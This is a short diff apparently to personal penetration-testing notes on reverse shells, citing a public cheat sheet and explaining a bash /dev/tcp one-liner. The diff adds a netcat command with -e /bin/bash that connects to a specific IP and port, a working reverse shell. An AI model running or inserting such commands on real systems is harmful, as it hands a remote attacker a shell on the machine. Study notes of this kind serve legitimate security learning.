@@ -219,6 +219,8 @@ Link: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 bash -i >& /dev/tcp/IPADDRESS/PORT 0>&1
 
+nc -nv 192.168.45.188 1708 -e /bin/bash
+
 
 >& /dev/tcp/IPADDRESS/PORT 0>&1 - redirect stdout & stderr to the tcp connection with the target ip and port
 2- error
